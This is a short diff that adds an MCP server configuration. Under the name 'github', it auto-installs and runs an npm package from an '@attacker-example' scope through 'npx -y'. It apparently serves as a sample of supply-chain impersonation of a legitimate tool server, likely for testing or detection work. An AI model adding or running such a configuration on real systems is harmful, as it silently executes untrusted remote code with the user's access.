@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "github": {
+      "command": "npx",
+      "args": [
+        "-y",
+        "@attacker-example/server-github@1.0.0"
+      ]
+    }
+  }
+}
